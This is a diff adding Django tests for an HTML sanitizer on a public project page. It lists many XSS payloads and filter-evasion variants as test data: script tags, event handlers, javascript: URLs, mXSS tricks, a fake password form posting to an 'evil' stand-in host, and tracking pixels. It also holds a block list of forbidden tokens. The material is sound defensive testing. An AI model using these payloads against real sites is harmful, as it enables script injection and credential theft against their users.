@@ -1472,3 +1472,286 @@ class ContentSecurityPolicyTests(TestCase):
     def test_the_site_script_is_a_file_not_inline_code(self):
         body = self.client.get(reverse("home")).content.decode()
         self.assertEqual(len(re.findall(r'<script src="/static/website/site\.js"', body)), 1)
+
+
+# ---------------------------------------------------------------------------
+# Rich text on the public project page is sanitised (audit item E, variant 1)
+# ---------------------------------------------------------------------------
+from io import StringIO
+
+from .sanitize import ALLOWED_ATTRIBUTES, ALLOWED_TAGS, CORE_TAGS, sanitize_html
+
+# The payloads used in the audit of the project page, in the same shape.
+AUDIT_PAYLOAD = (
+    '<p>Paragraf normal.</p>'
+    '<script>window.__x=(window.__x||[]).concat("script-tag")</script>'
+    '<img src="x" onerror="window.__x=(window.__x||[]).concat(\'onerror-attribute\')">'
+    '<svg onload="window.__x=(window.__x||[]).concat(\'svg-onload\')"></svg>'
+    '<a id="jslink" href="javascript:window.__x=(window.__x||[]).concat(\'javascript-url\')">link javascript</a>'
+    '<iframe id="evilframe" src="https://evil-iframe.example/" width="200" height="60"></iframe>'
+    '<img id="pixel" src="https://evil-tracker.example/pixel.png">'
+    '<form id="evilform" action="https://evil-form.example/steal" method="post">'
+    '<input name="parola" placeholder="Parola ta"><button type="submit">Trimite</button></form>'
+    '<style>body{background:rgb(255,0,0)!important}</style>'
+    '<meta http-equiv="refresh" content="2;url=https://evil-meta.example/redirect">'
+    '<a id="plainlink" href="https://good.example/">link obișnuit</a>'
+    '<a href="https://good.example/2" onclick="alert(5)" style="color:red">cu atribute</a>'
+)
+
+# More ways around a naive filter.
+EVASIONS = {
+    "mixed-case scheme": '<a href="JaVaScRiPt:alert(1)">x</a>',
+    "tab inside scheme": '<a href="java\tscript:alert(1)">x</a>',
+    "numeric entity scheme": '<a href="&#106;avascript:alert(1)">x</a>',
+    "hex entity with tab": '<a href="jav&#x09;ascript:alert(1)">x</a>',
+    "leading space": '<a href=" javascript:alert(1)">x</a>',
+    "leading control char": '<a href="\x01javascript:alert(1)">x</a>',
+    "data html": '<a href="data:text/html,<script>alert(1)</script>">x</a>',
+    "vbscript": '<a href="vbscript:msgbox(1)">x</a>',
+    "file": '<a href="file:///etc/passwd">x</a>',
+    "javascript img": '<img src="javascript:alert(1)">',
+    "svg style mxss": '<svg><style><img src=x onerror=alert(1)></style></svg>',
+    "math mxss": '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
+    "noscript mxss": '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+    "nested script": '<scr<script>ipt>alert(1)</scr</script>ipt>',
+    "slash handler": '<img src=x onerror=alert(1)//>',
+    "details toggle": '<details open ontoggle=alert(1)>x</details>',
+    "autofocus input": '<input autofocus onfocus=alert(1)>',
+    "video source": '<video><source onerror=alert(1)></video>',
+    "body onload": '<body onload=alert(1)>x',
+    "html comment": '<!--<script>alert(1)</script>-->x',
+    "css expression": '<span style="background-color:expression(alert(1))">x</span>',
+    "css behavior": '<span style="color:red;behavior:url(x.htc)">x</span>',
+    "css url": '<span style="background-color:red;background-image:url(javascript:alert(1))">x</span>',
+    "object": '<object data="https://evil-object.example/x.swf"></object>',
+    "embed": '<embed src="https://evil-embed.example/x.swf">',
+    "base": '<base href="https://evil-base.example/">',
+    "link stylesheet": '<link rel="stylesheet" href="https://evil-css.example/x.css">',
+    "style attribute on p": '<p style="position:fixed;top:0;left:0;width:100%">x</p>',
+    "form button": '<form action="https://evil-form.example"><button formaction="https://evil-form.example">x</button></form>',
+}
+
+FORBIDDEN = (
+    "<script", "</script", "onerror", "onload", "onclick", "onfocus", "ontoggle", "javascript:", "vbscript:",
+    "<iframe", "<form", "<input", "<meta", "<style", "<svg", "<math", "<object", "<embed", "<base", "<link",
+    "<video", "<noscript", "<template", "http-equiv", "expression(", "behavior", "data:text", "file:",
+    "<body", "<!--", "formaction",
+)
+
+
+class RichTextSanitizerUnitTests(TestCase):
+    def assertSafe(self, output, label=""):
+        lowered = output.lower()
+        for token in FORBIDDEN:
+            self.assertNotIn(token, lowered, f"{label}: {token!r} survived in {output!r}")
+
+    def test_audit_payload_is_neutralised_and_the_innocent_parts_stay(self):
+        out = sanitize_html(AUDIT_PAYLOAD)
+        self.assertSafe(out, "audit payload")
+        self.assertNotIn("alert(", out)
+        self.assertNotIn("window.__x", out)
+        for host in ("evil-iframe.example", "evil-tracker.example", "evil-form.example", "evil-meta.example"):
+            self.assertNotIn(host, out)
+        self.assertIn("<p>Paragraf normal.</p>", out)
+        self.assertIn('<a href="https://good.example/" rel="noopener noreferrer">link obișnuit</a>', out)
+        self.assertIn('<a href="https://good.example/2" rel="noopener noreferrer">cu atribute</a>', out)
+
+    def test_every_evasion_is_neutralised(self):
+        for label, payload in EVASIONS.items():
+            with self.subTest(evasion=label):
+                self.assertSafe(sanitize_html(payload), label)
+
+    def test_evasions_that_contain_a_link_keep_the_text_but_lose_the_href(self):
+        for label in ("mixed-case scheme", "tab inside scheme", "numeric entity scheme", "hex entity with tab",
+                      "leading space", "leading control char", "data html", "vbscript", "file"):
+            with self.subTest(evasion=label):
+                out = sanitize_html(EVASIONS[label])
+                self.assertNotIn("href", out)
+                self.assertIn("x", out)
+
+    def test_sanitising_twice_changes_nothing(self):
+        for payload in (AUDIT_PAYLOAD, *EVASIONS.values()):
+            once = sanitize_html(payload)
+            self.assertEqual(sanitize_html(once), once)
+
+    def test_empty_values(self):
+        self.assertEqual(sanitize_html(""), "")
+        self.assertEqual(sanitize_html(None), "")
+
+    def test_only_safe_link_schemes_keep_their_href(self):
+        for href in ("https://a.example/", "http://a.example/", "mailto:a@b.ro", "tel:+40123456789", "/contact/", "#sectiune"):
+            with self.subTest(href=href):
+                self.assertIn(f'href="{href}"', sanitize_html(f'<a href="{href}">t</a>'))
+        for href in ("javascript:alert(1)", "data:text/plain,x", "ftp://a.example/", "sms:+40123", "ssh://a.example"):
+            with self.subTest(href=href):
+                self.assertNotIn("href", sanitize_html(f'<a href="{href}">t</a>'))
+
+    def test_links_get_rel_noopener_noreferrer_and_lose_target(self):
+        out = sanitize_html('<a href="https://a.example/" target="_blank" rel="opener">t</a>')
+        self.assertEqual(out, '<a href="https://a.example/" rel="noopener noreferrer">t</a>')
+
+
+class RichTextFormattingIsPreservedTests(TestCase):
+    """What the editor produces today must come out exactly as it went in."""
+
+    EDITOR_OUTPUT = [
+        "<p>Un paragraf cu <strong>bold</strong>, <em>italic</em> și <u>subliniat</u>.</p>",
+        "<ul><li>unu</li><li>doi</li></ul>",
+        "<ol><li>primul</li><li>al doilea</li></ol>",
+        "<h2>Titlu</h2><h3>Subtitlu</h3><h4>Titlu mic</h4>",
+        "<blockquote><p>Un citat.</p></blockquote>",
+        "<p>Rând unu<br>rând doi</p>",
+        "<p>ă î â ș ț Ă Î Â Ș Ț „ghilimele” – liniuță &amp; semn</p>",
+        "<p>a&nbsp;b</p>",
+    ]
+
+    def test_editor_output_is_unchanged(self):
+        for html in self.EDITOR_OUTPUT:
+            with self.subTest(html=html):
+                self.assertEqual(sanitize_html(html), html)
+
+    def test_older_content_written_with_the_previous_toolbar_keeps_its_look(self):
+        cases = {
+            "table": ('<table><tbody><tr><th colspan="2">T</th></tr><tr><td>a</td><td>b</td></tr></tbody></table>',
+                      '<table><tbody><tr><th colspan="2">T</th></tr><tr><td>a</td><td>b</td></tr></tbody></table>'),
+            "rule, pre, strike": ("<hr><pre>cod</pre><s>tăiat</s>", "<hr><pre>cod</pre><s>tăiat</s>"),
+            "old headings": ("<h1>A</h1><h5>b</h5><h6>c</h6>", "<h1>A</h1><h5>b</h5><h6>c</h6>"),
+            "b and i": ("<p><b>gros</b> <i>aplecat</i></p>", "<p><b>gros</b> <i>aplecat</i></p>"),
+            "text colour": ('<p><span style="color:#ff0000">roșu</span></p>', '<p><span style="color:#ff0000">roșu</span></p>'),
+            "background colour": ('<span style="background-color:#ffff00">galben</span>', '<span style="background-color:#ffff00">galben</span>'),
+            "image": ('<img alt="x" src="/media/projects/a.png" width="300" height="200">',
+                      '<img alt="x" src="/media/projects/a.png" width="300" height="200">'),
+        }
+        for label, (given, expected) in cases.items():
+            with self.subTest(case=label):
+                self.assertEqual(sanitize_html(given), expected)
+
+    def test_images_may_only_come_from_this_site(self):
+        self.assertEqual(sanitize_html('<img src="/media/a.png" alt="x">'), '<img src="/media/a.png" alt="x">')
+        self.assertEqual(sanitize_html('<img src="images/a.png">'), '<img src="images/a.png">')
+        for src in ("https://tracker.example/p.png", "http://tracker.example/p.png", "//tracker.example/p.png",
+                    "data:image/png;base64,AAAA", "javascript:alert(1)", " https://tracker.example/p.png"):
+            with self.subTest(src=src):
+                out = sanitize_html(f'<img src="{src}" alt="x">')
+                self.assertNotIn("tracker.example", out)
+                self.assertNotIn("data:", out)
+                self.assertNotIn("javascript", out)
+
+    def test_a_style_keeps_only_plain_colour_values(self):
+        cases = {
+            'color:#f00': 'color:#f00',
+            'color:red;background-color:rgb(0, 128, 0)': 'color:red;background-color:rgb(0, 128, 0)',
+            'color:hsla(120,50%,50%,0.5)': 'color:hsla(120, 50%, 50%, 0.5)',  # nh3 re-serialises with spaces
+            'background-color:expression(alert(1))': None,
+            'color:url(https://x/y)': None,
+            'color:red !important': None,
+            'color:var(--x)': None,
+            'color:red;position:fixed': 'color:red',
+            'font-size:99px': None,
+        }
+        for style, expected in cases.items():
+            with self.subTest(style=style):
+                out = sanitize_html(f'<span style="{style}">x</span>')
+                self.assertEqual(out, f'<span style="{expected}">x</span>' if expected else "<span>x</span>")
+
+    def test_only_the_colour_properties_survive_in_a_style(self):
+        out = sanitize_html('<span style="color:#f00;font-size:40px;position:fixed;background-color:#0f0">x</span>')
+        self.assertEqual(out, '<span style="color:#f00;background-color:#0f0">x</span>')
+
+    def test_the_allowed_list_covers_everything_the_editor_is_configured_to_produce(self):
+        """If the editor config in settings.py ever gains a tag, this fails until
+        the sanitizer allows it too, so a new button can never silently lose formatting."""
+        spec = settings.CKEDITOR_CONFIGS["default"]["allowedContent"]
+        tags = {word.split("[")[0] for word in re.split(r"[;\s]+", spec) if word}
+        self.assertTrue(tags <= ALLOWED_TAGS, f"missing from the sanitizer: {tags - ALLOWED_TAGS}")
+        self.assertTrue(tags <= CORE_TAGS)
+        self.assertIn("href", ALLOWED_ATTRIBUTES["a"])
+
+
+class ProjectPageSanitizingTests(TestCase):
+    def make_hostile_project(self):
+        return make_project(title="Ostil", problem=AUDIT_PAYLOAD, solution=AUDIT_PAYLOAD, outcome=AUDIT_PAYLOAD)
+
+    def page(self, project):
+        return self.client.get(reverse("project_detail", args=[project.slug]))
+
+    def test_all_three_rich_fields_are_sanitised_on_the_public_page(self):
+        body = self.page(self.make_hostile_project()).content.decode()
+        self.assertEqual(body.count("Paragraf normal."), 3)
+        self.assertEqual(body.count('href="https://good.example/"'), 3)
+        for host in ("evil-iframe.example", "evil-tracker.example", "evil-form.example", "evil-meta.example"):
+            self.assertNotIn(host, body)
+        for token in ("alert(", "onerror", "onload", "onclick", "javascript:", "http-equiv", 'id="evilform"', "evilframe", "pixel.png"):
+            self.assertNotIn(token, body)
+
+    def test_nothing_stored_in_the_database_is_modified(self):
+        project = self.make_hostile_project()
+        self.page(project)
+        project.refresh_from_db()
+        self.assertEqual(project.problem, AUDIT_PAYLOAD)
+        self.assertEqual(project.solution, AUDIT_PAYLOAD)
+        self.assertEqual(project.outcome, AUDIT_PAYLOAD)
+
+    def test_the_template_no_longer_uses_the_safe_filter_on_editor_html(self):
+        source = (ROOT / "templates" / "website" / "project_detail.html").read_text(encoding="utf-8")
+        self.assertNotIn("|safe", source)
+        for field in ("problem", "solution", "outcome"):
+            self.assertIn(f"project.{field}|sanitize_html", source)
+
+    def test_normal_formatting_reaches_the_page(self):
+        project = make_project(
+            title="Format", problem="<h2>Titlu intern</h2><p>Text <strong>gros</strong></p>",
+            solution="<ul><li>primul</li></ul>", outcome="<blockquote><p>Citat</p></blockquote>",
+        )
+        body = self.page(project).content.decode()
+        for fragment in ("<h2>Titlu intern</h2>", "<strong>gros</strong>", "<ul><li>primul</li></ul>", "<blockquote><p>Citat</p></blockquote>"):
+            self.assertIn(fragment, body)
+
+    def test_the_strict_csp_header_still_applies_to_the_page(self):
+        self.assertEqual(self.page(self.make_hostile_project())["Content-Security-Policy"], CSP_PUBLIC)
+
+    def test_nh3_is_pinned_in_the_requirements(self):
+        self.assertRegex((ROOT / "requirements.txt").read_text(), r"(?m)^nh3==\d+\.\d+\.\d+$")
+
+
+class AuditRichTextCommandTests(TestCase):
+    def run_command(self, *args):
+        out = StringIO()
+        call_command("audit_rich_text", *args, stdout=out)
+        return out.getvalue()
+
+    def test_reports_what_would_be_removed_and_changes_nothing(self):
+        clean = make_project(title="Curat", problem="<p>ok</p>", solution="<ul><li>a</li></ul>", outcome="<h2>b</h2>")
+        hostile = make_project(title="Ostil", problem=AUDIT_PAYLOAD, solution="<p>ok</p>", outcome="<p>ok</p>")
+        legacy = make_project(title="Vechi", problem='<p><font color="red">roșu</font></p>', solution="<p>ok</p>", outcome="<p>ok</p>")
+        before = {p.pk: (p.problem, p.solution, p.outcome) for p in (clean, hostile, legacy)}
+
+        with self.assertNumQueries(1):
+            report = self.run_command()
+
+        self.assertIn("Projects: 3", report)
+        self.assertIn("Fields where it removes something: 2", report)
+        self.assertIn("<script> x1", report)
+        self.assertIn("<iframe> x1", report)
+        self.assertIn("<form> x1", report)
+        self.assertIn("<meta> x1", report)
+        self.assertIn("javascript: x1", report)
+        self.assertIn("img[onerror] x1", report)
+        self.assertIn("<font> x1", report)
+        self.assertIn("ostil / problem", report)
+        self.assertNotIn("curat /", report)
+        after = {p.pk: (p.problem, p.solution, p.outcome) for p in Project.objects.all()}
+        self.assertEqual(before, after)
+
+    def test_clean_content_is_reported_as_untouched(self):
+        make_project(title="Curat", problem="<p>ok</p>", solution="<p>ok</p>", outcome="<p>ok</p>")
+        self.assertIn("Nothing to remove", self.run_command())
+
+    def test_show_diff_prints_before_and_after(self):
+        make_project(title="Ostil", problem="<p>x</p><script>alert(1)</script>", solution="<p>s</p>", outcome="<p>o</p>")
+        report = self.run_command("--show-diff")
+        self.assertIn("before:", report)
+        self.assertIn("after :", report)
+
+    def test_works_with_no_projects(self):
+        self.assertIn("Projects: 0", self.run_command())
